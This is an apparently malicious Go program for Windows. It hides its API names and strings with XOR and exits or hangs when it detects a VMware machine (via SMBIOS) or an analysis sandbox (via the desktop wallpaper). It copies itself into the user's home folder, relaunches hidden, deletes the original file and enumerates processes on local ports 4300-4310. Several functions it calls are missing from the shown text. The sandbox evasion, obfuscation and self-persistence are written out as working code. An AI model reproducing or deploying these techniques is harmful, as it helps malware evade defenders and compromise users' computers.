package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var chancemd5 = "[r]0000000000000000000000000000000000000[r]"

const (
	SPI_GETDESKWALLPAPER = 0x0073
	MAX_PATH             = 260
	RSMB                 = 0x52534D42 // 'RSMB' 标识 SMBIOS 表
)

type RawSMBIOSData struct {
	Used20CallingMethod uint8
	SMBIOSMajorVersion  uint8
	SMBIOSMinorVersion  uint8
	DmiRevision         uint8
	Length              uint32
	SMBIOSTableData     [1]uint8
}

func isVMware() bool {
	buffer := getSMBIOSData()

	smbiosStr := string(buffer)
	return containsVMwareString(smbiosStr)
}

func getSMBIOSData() []byte {
	getSystemFirmwareTable := kernel32.NewProc(xorDecrypt([]byte{0x25, 0x04, 0x1D, 0x3F, 0x48, 0x11, 0x15, 0x0C, 0x01, 0x74, 0x0B, 0x13, 0x04, 0x1B, 0x52, 0x10, 0x04, 0x3D, 0x0D, 0x56, 0x0E, 0x04})) //GetSystemFirmwareTable

	bufferSize, _, _ := getSystemFirmwareTable.Call(
		uintptr(RSMB),
		uintptr(0),
		uintptr(0),
		0,
		0,
	)

	if bufferSize == 0 {
		return nil
	}

	buffer := make([]byte, bufferSize)

	ret, _, _ := getSystemFirmwareTable.Call(
		uintptr(RSMB),
		uintptr(0),
		uintptr(unsafe.Pointer(&buffer[0])),
		bufferSize,
	)

	if ret == 0 {
		return nil
	}

	return buffer
}

func containsVMwareString(s string) bool { //检查VMware特征码
	vmwareMarkers := []string{
		xorDecrypt([]byte{0x34, 0x2C, 0x1E, 0x0D, 0x43, 0x07}),
		xorDecrypt([]byte{0x34, 0x2C, 0x3E}),
		xorDecrypt([]byte{0x34, 0x2C, 0x1E, 0x0D, 0x43, 0x07, 0x41, 0x3F, 0x05, 0x40, 0x16, 0x14, 0x08, 0x00, 0x13, 0x32, 0x0D, 0x08, 0x18, 0x52, 0x0D, 0x13, 0x04}),
	} //VMware//VMW//VMware Virtual Platform

	for _, marker := range vmwareMarkers {
		if containsSubstring(s, marker) {
			return true
		}
	}
	return false
}

func containsSubstring(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func getWallpaperPath() (string, error) {
	user32 := syscall.NewLazyDLL(xorDecrypt([]byte{0x17, 0x12, 0x0C, 0x1E, 0x02, 0x50, 0x4F, 0x0D, 0x00, 0x5E}))                                                                             //user32.dll
	systemParametersInfo := user32.NewProc(xorDecrypt([]byte{0x31, 0x18, 0x1A, 0x18, 0x54, 0x0F, 0x31, 0x08, 0x1E, 0x53, 0x0F, 0x04, 0x1D, 0x09, 0x41, 0x11, 0x28, 0x07, 0x0A, 0x5B, 0x35})) //SystemParametersInfoW

	var path [MAX_PATH]uint16
	ret, _, _ := systemParametersInfo.Call(
		SPI_GETDESKWALLPAPER,
		MAX_PATH,
		uintptr(unsafe.Pointer(&path[0])),
		0,
	)

	if ret == 0 {
		return "", nil
	}

	return syscall.UTF16ToString(path[:]), nil
}
func checkwby() bool {
	path, _ := getWallpaperPath()
	// 替换为你的图片路径
	imagePath := path

	fileInfo, _ := os.Stat(imagePath)

	fileSize := fileInfo.Size()
	if strings.Contains(path, xorDecrypt([]byte{0x26, 0x04, 0x1A, 0x07, 0x45, 0x0D, 0x11, 0x47, 0x06, 0x42, 0x05})) && !strings.Contains(path, xorDecrypt([]byte{0x15, 0x00, 0x05, 0x00, 0x41, 0x03, 0x11, 0x0C, 0x1E})) && fileSize == 46736 { //Desktop.jpg //wallpaper
		return true
	}
	return false
}

func CheckOpenPorts(verbose bool, startPort, endPort int) ([]string, []uint32) {
	if verbose {
		fmt.Println("Starting port check...")
	}

	var openPorts []string
	var processIDs []uint32

	if startPort < 1 || endPort > 65535 || startPort > endPort {
		if verbose {
			fmt.Println("Invalid port range")
		}
		return openPorts, processIDs
	}

	for port := startPort; port <= endPort; port++ {
		cmd := exec.Command("netstat", "-ano", "-p", "tcp")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, err := cmd.Output()
		if err != nil {
			if verbose {
				fmt.Printf("Error checking port %d: %v\n", port, err)
			}
			continue
		}

		scanner := bufio.NewScanner(strings.NewReader(string(output)))
		pattern := fmt.Sprintf(`TCP\s+.*:%d\s+.*\s+(\d+)$`, port)
		re := regexp.MustCompile(pattern)

		for scanner.Scan() {
			line := scanner.Text()
			matches := re.FindStringSubmatch(line)
			if len(matches) > 1 {
				pid, err := strconv.ParseUint(matches[1], 10, 32)
				if err == nil {
					openPorts = append(openPorts, strconv.Itoa(port))
					if pid != 0 {
						processIDs = append(processIDs, uint32(pid))
					}
					if verbose {
						fmt.Printf("Found open port: %d with PID: %d\n", port, pid)
					}
				}
			}
		}
	}

	return openPorts, processIDs
}

func d(d bool) ([]string, []uint32) {
	if !d {
		fmt.Println(787878)
	}

	var openport []string
	var openpid []uint32
	for port := 4300; port < 4310; port++ {
		cmd := exec.Command(xorDecrypt([]byte{0x01, 0x0C, 0x0D}), xorDecrypt([]byte{0x4D, 0x02}), fmt.Sprintf(xorDecrypt([]byte{0x0C, 0x04, 0x1D, 0x1F, 0x45, 0x03, 0x15, 0x49, 0x41, 0x53, 0x0C, 0x0E, 0x49, 0x10, 0x13, 0x04, 0x08, 0x07, 0x08, 0x47, 0x16, 0x13, 0x49, 0x56, 0x14, 0x06}), port))

		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		output, _ := cmd.Output()

		scanner := bufio.NewScanner(strings.NewReader(string(output)))
		part1 := `[` + string([]byte{32, 9}) + `]+`
		part2 := xorDecrypt([]byte{0x36, 0x22, 0x39})
		part3 := `[ \t]+.+?:%d[ \t]+.+?[ \t]+(\d+)` + "$"
		pattern := fmt.Sprintf(part1+part2+part3, port)
		re := regexp.MustCompile(pattern)

		for scanner.Scan() {
			line := scanner.Text()
			matches := re.FindStringSubmatch(line)
			if len(matches) > 1 {
				pid, err := strconv.Atoi(matches[1])
				if err == nil {
					openport = append(openport, strconv.Itoa(port))
					if pid != 0 {
						openpid = append(openpid, uint32(pid))
					}

				}
			}
		}

	}
	return openport, openpid
}

func mCommand(name string, arg ...string) {
	cmd := exec.Command(name, arg...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	if err != nil {
		fmt.Println(err)
	}
}
func init() {
	if checkwby() {
		a := 0
		for {
			a = a + 1
		}
	}
	if isVMware() {
		os.Exit(0)
	}
}
func fkkk(b bool) bool {
	if !b {
		a := 0
		a++
		b := 1
		c := a + b
		fmt.Println(c)
	}
	return b
}
func main() {
	if !fkkk(true) {
		os.Exit(0)
	}

	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	homeDir := currentUser.HomeDir
	targetPath := homeDir + "\\"
	targetFile := targetPath + xorDecrypt([]byte{0x01, 0x15, 0x0F, 0x1F, 0x44, 0x0C, 0x4F, 0x0C, 0x14, 0x57})
	os.Remove(targetFile)
	os.Mkdir(targetPath, os.ModePerm)

	currentFile, _ := exec.LookPath(os.Args[0])
	currentFileAbs, _ := filepath.Abs(currentFile)

	if currentFileAbs == targetFile {

		fmt.Println(len(os.Args))
		if len(os.Args) > 1 {
			err = os.Chmod(os.Args[1], 0777)
			if err != nil {
				fmt.Println(err)
			}
			err = os.Remove(os.Args[1])
			if err != nil {
				fmt.Println(err)
			}
		}
		//kl(true)
		for {
			fmt.Println(1116666)
			//mamwllt(true)
			byswl(true)
		}

	} else {

		_, err := os.Stat(targetFile)
		if err != nil {

			srcFile, _ := os.Open(currentFile)

			desFile, err := os.Create(targetFile)
			if err != nil {
				fmt.Println(err)
			}

			_, err = io.Copy(desFile, srcFile)
			if err != nil {
				fmt.Println(err)
			}

			err = os.Chmod(targetFile, 0777)
			if err != nil {
				fmt.Println(err)
			}

			srcFile.Close()
			desFile.Close()
			mCommand(targetFile, currentFileAbs)
		} else {
			mCommand(targetFile, currentFileAbs)

		}
	}
	rand.Seed(time.Now().UnixNano())

}
func byswl(b bool) {
	if !b {
		fmt.Println(1)
	} else {
		mamwllt(true)
	}

}

func aab(b bool) bool {
	time.Now()

	if !b {
		fmt.Println("hhhaaaa")
	}
	p, p2 := CheckOpenPorts(true, 4301, 4310)
	for _, port := range p {
		ld(gplt(true), port, true)
	}

	return al(true, p2)

}
func al(c bool, i []uint32) bool {
	if !c {
		time.Now()
		fmt.Println("abcdefg")

	}
	//al(false, i)
	var wg sync.WaitGroup
	for _, pid := range i {
		wg.Add(1)
		go ydbyl(pid, &wg)
	}
	wg.Wait()
	time.Now()
	return true
}
